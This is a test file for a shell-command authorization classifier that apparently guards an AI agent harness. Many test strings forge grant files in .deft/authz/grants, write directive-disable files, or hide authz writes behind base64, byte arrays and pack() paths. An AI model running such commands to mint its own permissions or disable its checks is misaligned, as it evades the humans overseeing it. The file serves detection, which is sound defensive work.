    expect(classifyShellAuthzOps("unknownwriter -Destination /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("git bundle create /tmp/out.bundle HEAD")).toEqual([]);
    expect(classifyShellAuthzOps("sponge /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("pscp host:g.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("jj clone https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps('bun -e "console.log(1)"')).toEqual([]);
    expect(classifyShellAuthzOps("php -r 'echo 1;'")).toEqual([]);
    expect(classifyShellAuthzOps("jj log")).toEqual([]);
    expect(
      classifyShellAuthzOps("pscp -o IdentityFile=.deft-directive-disable host:x /tmp/out"),
    ).toEqual([]);
    // Read-only git bundle ops are not dest plants (#3529 Greptile P1).
    expect(classifyShellAuthzOps("git bundle verify .deft/authz/grants/evil.bundle")).toEqual([]);
    expect(classifyShellAuthzOps("git bundle list-heads .deft/authz/grants/evil.bundle")).toEqual(
      [],
    );
    expect(classifyShellAuthzOps("git bundle unbundle .deft/authz/grants/evil.bundle")).toEqual([]);
    // Quoted PHP identifier without a call is not a write (#3529 Greptile P1).
    expect(classifyShellAuthzOps("php -r 'echo \"file_put_contents\";'")).toEqual([]);
    expect(classifyShellAuthzOps("php -r 'echo \"file_put_contents ($x)\";'")).toEqual([]);
    // Boolean git globals must not hide bundle create (#3529 Greptile P1).
    expect(
      classifyShellAuthzOps("git --no-color bundle create .deft/authz/grants/evil.bundle HEAD"),
    ).toContain("settings");
    // PHP call with whitespace before `(` is still a write (#3529 Greptile P1).
    expect(classifyShellAuthzOps("php -r 'file_put_contents ($p, $d);'")).toContain("settings");
  });

  it("classifies residual dest-form plants after #3529 as settings (#3545)", () => {
    for (const cmd of [
      "ruby3.3 -e \"File.write('.deft/authz/grants/evil.json','{}')\"",
      "jruby -e \"File.write('.deft/authz/grants/evil.json','{}')\"",
      "pypy3 -c \"open('.deft/authz/grants/evil.json','w').write('{}')\"",
      "perl -e \"write_file('.deft/authz/grants/evil.json','{}')\"",
      "perl -e \"path('.deft/authz/grants/evil.json')->spew('{}')\"",
      "perl -e \"open F,'>','.deft/authz/grants/evil.json'\"",
      "make DESTDIR=.deft/authz/grants install",
      "dpkg -x pkg.deb .deft/authz/grants",
      "fromdos .deft/authz/grants/evil.json",
      "todos .deft/authz/grants/evil.json",
      "emacsclient .deft/authz/grants/evil.json",
      "pico .deft/authz/grants/evil.json",
      "pdftk in.pdf output .deft/authz/grants/evil.pdf",
      "gs -sOutputFile=.deft/authz/grants/evil.pdf",
      "npx degit user/repo .deft/authz/grants",
      "composer create-project pkg .deft/authz/grants",
      "ddrescue src .deft/authz/grants/evil.json",
      "dc3dd if=src of=.deft/authz/grants/evil.json",
      "sg_dd if=src of=.deft/authz/grants/evil.json",
      "darcs --repodir=.deft/authz/grants init",
      "unknownwriter --repodir .deft/authz/grants",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    for (const cmd of [
      "ruby3.3 -e \"File.write('.deft-directive-disable','')\"",
      "pypy3 -c \"open('.deft-directive-disable','w').write('')\"",
      "jruby -e \"File.write('.no-deft-directive','')\"",
      "fromdos .deft-directive-disable",
      "emacsclient .deft-directive-disable",
      "pico .no-deft-directive",
      "ddrescue src .deft-directive-disable",
      "dc3dd if=src of=.no-deft-directive",
      "npx degit user/repo .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied peers stay settings.
    expect(
      classifyShellAuthzOps("ruby -e \"File.write('.deft/authz/grants/evil.json','{}')\""),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("python3 -c \"open('.deft/authz/grants/evil.json','w').write('{}')\""),
    ).toContain("settings");
    expect(classifyShellAuthzOps("dpkg-deb -x pkg.deb .deft/authz/grants")).toContain("settings");
    expect(classifyShellAuthzOps("xcopy forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    // Approved-scope mint symmetry (#3545 MEDIUM).
    expect(
      classifyShellAuthzOps("ruby3.3 -e \"File.write('.deft/approved-scope/story.json','{}')\""),
    ).toContain("settings");
    expect(classifyShellAuthzOps("fromdos .deft/approved-scope/story.json")).toContain("settings");
    expect(classifyShellAuthzOps("npx degit user/repo .deft/approved-scope")).toContain("settings");
    expect(classifyShellAuthzOps("make DESTDIR=.deft/approved-scope install")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("darcs --repodir=.deft/approved-scope init")).toContain(
      "settings",
    );
    // Ordinary dests stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("fromdos /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("todos /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("emacsclient /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("pico /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("dpkg -x pkg.deb /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("make DESTDIR=/tmp/out install")).toEqual([]);
    expect(classifyShellAuthzOps("npx degit user/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("composer create-project pkg /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("ddrescue src /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("dc3dd if=src of=/tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("sg_dd if=src of=/tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("darcs --repodir=/tmp/out init")).toEqual([]);
    expect(classifyShellAuthzOps("pdftk in.pdf output /tmp/out.pdf")).toEqual([]);
    expect(classifyShellAuthzOps("gs -sOutputFile=/tmp/out.pdf")).toEqual([]);
    expect(classifyShellAuthzOps("unknownwriter --repodir /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps('ruby3.3 -e "puts 1"')).toEqual([]);
    expect(classifyShellAuthzOps('jruby -e "puts 1"')).toEqual([]);
    expect(classifyShellAuthzOps('pypy3 -c "print(1)"')).toEqual([]);
    expect(classifyShellAuthzOps("perl -e 'print 1;'")).toEqual([]);
    // Quoted Perl identifier without a write call is not a write.
    expect(classifyShellAuthzOps("perl -e 'print \"write_file\";'")).toEqual([]);
    expect(classifyShellAuthzOps("perl -e \"print 'open F,>'\"")).toEqual([]);
    // DESTDIR= on a non-writer is not a dest plant (Greptile P1 #3545).
    expect(classifyShellAuthzOps("echo DESTDIR=.deft/authz/grants")).toEqual([]);
    expect(classifyShellAuthzOps("true PREFIX=.deft/approved-scope")).toEqual([]);
    expect(classifyShellAuthzOps("echo DESTDIR=.deft/authz/grants make")).toEqual([]);
    expect(classifyShellAuthzOps("DESTDIR=.deft/authz/grants make install")).toContain("settings");
    expect(classifyShellAuthzOps("env DESTDIR=.deft/authz/grants make install")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("sudo make DESTDIR=.deft/authz/grants install")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("timeout 5 make DESTDIR=.deft/authz/grants install")).toContain(
      "settings",
    );
  });

  it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
    // Base64/byte path construction — residual after #3110 literal path match.
    expect(
      classifyShellAuthzOps(
        "python3 -c \"import base64; p=base64.b64decode('LmRlZnQvYXV0aHovc3RhdGUuanNvbg==').decode(); open(p,'w').write('{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "node -e \"const p=Buffer.from('LmRlZnQvYXV0aHo=','base64').toString(); require('fs').writeFileSync(p,'{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "python -c \"p=bytes([0x2e,0x64,0x65,0x66,0x74]).decode(); open(p+'/authz/x','w').write('x')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("perl -e \"open(F,'>',pack('H*','2e64656674')); print F '{}'\""),
    ).toContain("settings");
    // Path-qualified / versioned interpreters (Greptile P1).
    expect(
      classifyShellAuthzOps("/usr/bin/python3 -c \"open('.deft/authz/x','w').write('{}')\""),
    ).toContain("settings");
    expect(classifyShellAuthzOps("python3.11 -c \"open('x','w').write('y')\"")).toContain(
      "settings",
    );
    // Compound safe prefix must not hide write residual (SLizard).
    expect(classifyShellAuthzOps("pytest && python -c \"open('x','w').write('y')\"")).toContain(
      "settings",
    );
    // Print-only / read-only programmatic shell stays unclassifiable.
    expect(classifyShellAuthzOps('python -c "print(1)"')).toEqual([]);
    expect(classifyShellAuthzOps("node -e \"console.log('ok')\"")).toEqual([]);
    expect(classifyShellAuthzOps("python -c \"print(open('report.txt').read())\"")).toEqual([]);
    // `.write` / `.write(` as quoted data is not a write API (Greptile conf residual).
    expect(classifyShellAuthzOps("python -c \"print('.write is a method name')\"")).toEqual([]);
    expect(classifyShellAuthzOps("python -c \"print('.write(')\"")).toEqual([]);
    expect(
      classifyShellAuthzOps("python -c \"import base64; print(base64.b64decode('YQ=='))\""),
    ).toEqual([]);
  });

  it("covers gh flag forms and hook name variants (#2986)", () => {
    // --flag=value form and remaining GH_VALUE_FLAGS spellings.
    expect(classifyShellAuthzOps("gh --repo=owner/repo pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --hostname github.com pr merge 1")).toContain("merge");
    expect(classifyShellAuthzOps("gh -a app pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --app app pr edit 3")).toContain("pr");
    expect(classifyShellAuthzOps("gh --jq . pr ready 2")).toContain("pr");
    expect(classifyShellAuthzOps("sudo gh pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("command gh pr merge 9")).toContain("merge");
    expect(classifyShellAuthzOps("pytest")).toContain("test");
    // Boolean short flags before resource are skipped without consuming a value.
    expect(classifyShellAuthzOps("gh --json pr merge 4")).toContain("merge");

    expect(
      classifyHookAuthzOps({
        toolName: "run_terminal_cmd",
        shellCommand: "git push origin HEAD",
        isDirectWrite: false,
      }),
    ).toContain("push");
    expect(
      classifyHookAuthzOps({
        toolName: "pull_request_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__x__pr_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "issue_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__github__create_issue",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
  });
});
